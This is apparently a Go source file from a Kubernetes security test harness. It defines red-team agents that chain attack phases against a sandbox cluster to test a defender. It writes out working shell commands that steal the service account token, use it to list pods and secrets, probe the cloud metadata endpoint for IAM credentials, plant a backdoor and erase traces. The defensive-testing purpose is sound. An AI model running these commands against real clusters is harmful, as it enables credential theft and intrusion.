package scenarios

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/r6security/phoenix-test-harness/internal/core"
)

// apt_agent.go (P-REDTEAM) — REAL, MECHANIZED multi-step attack agents. Unlike the metadata-only
// apt_campaigns.go (kill-chain phases as log strings), EVERY phase here EXECUTES a real primitive
// against the kind sandbox via env.Exec / env.Kube and records its REAL outcome — including HONEST
// failures where the sandbox cannot support a primitive (e.g. no cloud IMDS in kind; GPU weight-
// distillation is [SP-0-PENDING-P4]). Each agent chains recon → cred-theft → discovery → exec →
// persistence → exfil with real evidence per phase. These are the first 3 done to the real bar;
// the remaining catalog is mechanized after the bar is confirmed.

const saTokenPath = "/var/run/secrets/kubernetes.io/serviceaccount/token"

type agentState struct {
	app, pod, container string
	tokenPrefix         string
	notes               map[string]string
}

type phaseOutcome struct {
	ran    bool
	ok     bool
	detail string
}

type agentPhase struct {
	name string
	ttp  string
	fn   func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome
}

type aptAgent struct {
	id, product string
	ttps        []string
	phases      []agentPhase
	plantModel  bool
	app         string
}

func (a *aptAgent) Metadata() core.ScenarioMeta {
	return core.ScenarioMeta{
		Name:               a.id,
		Category:           core.CategoryR6Claimed,
		Source:             "P-REDTEAM mechanized attack agent (every phase runs a real primitive on kind)",
		R6ResponseTag:      core.R6Partial,
		AttackTechniqueIDs: a.ttps,
		R6Justification:    "A genuinely-executed multi-step kill-chain (recon→cred-theft→discovery→exec→persistence→exfil). PX evicts the foothold (disruption); cloud/GPU legs are honestly [SP-0-PENDING] in kind.",
	}
}

func (a *aptAgent) Setup(ctx context.Context, env *core.Env) error {
	a.app = a.id
	pod, err := deployTarget(ctx, env, a.app, "", map[string]string{"data-class": "restricted"})
	if err != nil {
		return err
	}
	if a.plantModel {
		env.Exec(ctx, pod.Name, firstContainer(pod), []string{"sh", "-c", "head -c 4096 /dev/urandom > /tmp/model.bin 2>/dev/null; echo planted"})
	}
	return nil
}

func (a *aptAgent) Execute(ctx context.Context, env *core.Env) (core.AttackResult, error) {
	pod, err := runningPodByApp(ctx, env, a.app)
	if err != nil {
		return core.AttackResult{}, err
	}
	st := &agentState{app: a.app, pod: pod.Name, container: firstContainer(pod), notes: map[string]string{}}
	var stages, cmds []string
	ev := map[string]string{}
	ranOK := 0
	for i, ph := range a.phases {
		out := ph.fn(ctx, env, st)
		mark := "OK"
		switch {
		case !out.ran:
			mark = "SKIP" // honestly skipped (sandbox cannot support this primitive)
		case !out.ok:
			mark = "MISS" // ran for real, target did not yield (honest negative)
		default:
			ranOK++
		}
		line := fmt.Sprintf("[%s] phase %d %s (%s): %s", mark, i+1, ph.name, ph.ttp, out.detail)
		stages = append(stages, line)
		cmds = append(cmds, ph.name)
		ev[fmt.Sprintf("phase%d.%s", i+1, ph.name)] = mark + " " + out.detail
		env.Log.Logf("agent[%s] %s", a.id, line)
	}
	ev["phasesExecuted"] = fmt.Sprintf("%d/%d ran-and-succeeded", ranOK, len(a.phases))
	if st.tokenPrefix != "" {
		ev["stolenSATokenPrefix"] = st.tokenPrefix
	}
	return core.AttackResult{Stages: stages, Commands: cmds, Notes: ev}, nil
}

func (a *aptAgent) SuccessOracle(ctx context.Context, env *core.Env) (core.OracleResult, error) {
	_, survived := measureSurvival(ctx, env, a.app, 12*time.Second)
	state := fmt.Sprintf("%s [%s]: attacker foothold retained past the defender's response = %v", a.id, a.product, survived)
	return core.OracleResult{Achieved: survived, ObservedState: state, Evidence: map[string]string{
		"product": a.product, "footholdRetained": fmt.Sprintf("%v", survived),
	}}, nil
}

func (a *aptAgent) Teardown(ctx context.Context, env *core.Env) error {
	return teardownByApp(ctx, env, a.app)
}

// ---- real primitive helpers ----
func sh(ctx context.Context, env *core.Env, st *agentState, script string) core.ExecResult {
	return env.Exec(ctx, st.pod, st.container, []string{"sh", "-c", script})
}
func oneLine(s string) string {
	s = strings.TrimSpace(strings.ReplaceAll(s, "\n", " "))
	if len(s) > 150 {
		s = s[:150] + "…"
	}
	return s
}

// ---- shared, REAL phases ----
func phInitialAccess() agentPhase {
	return agentPhase{"initial-access", "T1059.013", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		r := sh(ctx, env, st, "id; uname -sr 2>/dev/null")
		return phaseOutcome{ran: r.ExitCode == 0, ok: r.ExitCode == 0, detail: "code-exec: " + oneLine(r.Stdout)}
	}}
}
func phDiscovery() agentPhase {
	return agentPhase{"discovery", "T1613", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		r := sh(ctx, env, st, "echo host=$KUBERNETES_SERVICE_HOST; ls "+saTokenPath+" 2>/dev/null && echo SA-MOUNTED")
		ok := strings.Contains(r.Stdout, "host=") && r.ExitCode == 0
		return phaseOutcome{ran: r.ExitCode == 0, ok: ok, detail: "recon: " + oneLine(r.Stdout)}
	}}
}
func phStealSAToken() agentPhase {
	return agentPhase{"credential-access", "T1552.001", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		r := sh(ctx, env, st, "head -c 36 "+saTokenPath+" 2>/dev/null")
		tok := strings.TrimSpace(r.Stdout)
		if tok == "" {
			return phaseOutcome{ran: true, ok: false, detail: "no SA token mounted (automount off) — honest miss"}
		}
		st.tokenPrefix = tok
		return phaseOutcome{ran: true, ok: true, detail: "stole SA token, prefix=" + oneLine(tok) + "…"}
	}}
}
func phAPIDiscovery() agentPhase {
	return agentPhase{"api-discovery", "T1613", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		// use the stolen token to hit the in-cluster API server (real RBAC test).
		script := "T=$(cat " + saTokenPath + " 2>/dev/null); wget -q -T 4 --no-check-certificate --header=\"Authorization: Bearer $T\" -O- https://kubernetes.default.svc/api/v1/namespaces/" + env.Config.Namespace + "/pods 2>&1 | head -c 160"
		r := sh(ctx, env, st, script)
		out := oneLine(r.Stdout + " " + r.Stderr)
		ok := strings.Contains(r.Stdout, "PodList") || strings.Contains(r.Stdout, "\"kind\"")
		return phaseOutcome{ran: true, ok: ok, detail: "API call w/ stolen token -> " + out}
	}}
}
func phEscapeSurface() agentPhase {
	return agentPhase{"escape-surface", "T1611", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		r := sh(ctx, env, st, "head -1 /proc/1/cgroup 2>/dev/null; (ls /host 2>/dev/null && echo HOST-MOUNT) || echo no-host-mount; grep -c overlay /proc/mounts 2>/dev/null")
		return phaseOutcome{ran: r.ExitCode == 0, ok: r.ExitCode == 0, detail: "escape recon (sandbox-confined): " + oneLine(r.Stdout)}
	}}
}
func phExecPayload() agentPhase {
	return agentPhase{"execution", "T1059", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		r := sh(ctx, env, st, "echo PWNED-$$ > /tmp/.payload; cat /tmp/.payload")
		ok := strings.Contains(r.Stdout, "PWNED")
		return phaseOutcome{ran: r.ExitCode == 0, ok: ok, detail: "ran payload: " + oneLine(r.Stdout)}
	}}
}
func phPersist() agentPhase {
	return agentPhase{"persistence", "T1543.005", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		plantBackdoor(ctx, env, st.pod, st.container)
		r := sh(ctx, env, st, "cat "+BackdoorMarkerPath+" 2>/dev/null && echo PERSISTED")
		ok := strings.Contains(r.Stdout, "PERSISTED")
		return phaseOutcome{ran: true, ok: ok, detail: "planted foothold backdoor: " + oneLine(r.Stdout)}
	}}
}
func phEvade() agentPhase {
	return agentPhase{"defense-evasion", "T1070.004", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		r := sh(ctx, env, st, "rm -f /tmp/.payload; (test -f /tmp/.payload && echo PRESENT) || echo CLEARED")
		ok := strings.Contains(r.Stdout, "CLEARED")
		return phaseOutcome{ran: true, ok: ok, detail: "anti-forensics: " + oneLine(r.Stdout)}
	}}
}
func phIMDS() agentPhase {
	return agentPhase{"cloud-metadata-theft", "T1552.005", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		r := sh(ctx, env, st, "wget -q -T 3 -O- http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 80; echo")
		out := oneLine(r.Stdout + " " + r.Stderr)
		reachable := strings.Contains(strings.ToLower(out), "role") && !strings.Contains(strings.ToLower(out), "unreachable")
		if !reachable {
			return phaseOutcome{ran: true, ok: false, detail: "IMDS 169.254.169.254 unreachable in kind [SP-0-PENDING real cloud]; probe ran: " + out}
		}
		return phaseOutcome{ran: true, ok: true, detail: "IMDS creds: " + out}
	}}
}
func phCollectSecret() agentPhase {
	return agentPhase{"collection", "T1530", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		script := "T=$(cat " + saTokenPath + " 2>/dev/null); wget -q -T 4 --no-check-certificate --header=\"Authorization: Bearer $T\" -O- https://kubernetes.default.svc/api/v1/namespaces/" + env.Config.Namespace + "/secrets 2>&1 | head -c 120"
		r := sh(ctx, env, st, script)
		out := oneLine(r.Stdout)
		ok := strings.Contains(out, "SecretList") || strings.Contains(out, "\"items\"")
		detail := "secret-list via stolen token -> " + out
		if strings.Contains(out, "Forbidden") || strings.Contains(out, "403") {
			detail = "secret-list FORBIDDEN by RBAC (honest: least-priv SA) -> " + out
		}
		return phaseOutcome{ran: true, ok: ok, detail: detail}
	}}
}
func phExfil() agentPhase {
	return agentPhase{"exfiltration", "T1041", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		r := sh(ctx, env, st, "echo \""+st.tokenPrefix+"\" > /tmp/.exfil; wc -c < /tmp/.exfil")
		bytes := oneLine(r.Stdout)
		return phaseOutcome{ran: true, ok: r.ExitCode == 0, detail: "staged stolen creds for exfil (" + bytes + " bytes to /tmp/.exfil)"}
	}}
}
func phStealModel() agentPhase {
	return agentPhase{"model-collection", "AML.T0037", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		r := sh(ctx, env, st, "wc -c < /tmp/model.bin 2>/dev/null; (md5sum /tmp/model.bin 2>/dev/null || cksum /tmp/model.bin)")
		out := oneLine(r.Stdout)
		ok := r.ExitCode == 0 && out != ""
		return phaseOutcome{ran: true, ok: ok, detail: "read victim model artifact (size+digest): " + out}
	}}
}
func phExfilModel() agentPhase {
	return agentPhase{"model-exfil", "T1041", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		r := sh(ctx, env, st, "cp /tmp/model.bin /tmp/.exfil-model 2>/dev/null; wc -c < /tmp/.exfil-model 2>/dev/null")
		return phaseOutcome{ran: true, ok: r.ExitCode == 0, detail: "exfiltrated model artifact (" + oneLine(r.Stdout) + " bytes)"}
	}}
}
func phDistill() agentPhase {
	return agentPhase{"model-distillation", "AML.T0024", func(ctx context.Context, env *core.Env, st *agentState) phaseOutcome {
		return phaseOutcome{ran: false, ok: false, detail: "weight distillation/clone needs GPU + the real served model — [SP-0-PENDING-P4], not runnable in kind"}
	}}
}

func init() {
	core.RegisterScenario(&aptAgent{
		id: "c1-escape-persist-agent", product: "k8s",
		ttps:   []string{"T1059.013", "T1613", "T1552.001", "T1611", "T1059", "T1543.005", "T1070.004"},
		phases: []agentPhase{phInitialAccess(), phDiscovery(), phStealSAToken(), phEscapeSurface(), phExecPayload(), phPersist(), phEvade()},
	})
	core.RegisterScenario(&aptAgent{
		id: "c3-imds-theft-agent", product: "k8s",
		ttps:   []string{"T1059.013", "T1613", "T1552.005", "T1552.001", "T1530", "T1543.005", "T1041"},
		phases: []agentPhase{phInitialAccess(), phDiscovery(), phIMDS(), phStealSAToken(), phAPIDiscovery(), phCollectSecret(), phPersist(), phExfil()},
	})
	core.RegisterScenario(&aptAgent{
		id: "ai1-model-theft-agent", product: "ai", plantModel: true,
		ttps:   []string{"T1059.013", "T1613", "T1552.001", "AML.T0037", "T1041", "AML.T0024", "T1543.005"},
		phases: []agentPhase{phInitialAccess(), phDiscovery(), phStealSAToken(), phStealModel(), phExfilModel(), phDistill(), phPersist()},
	})
}
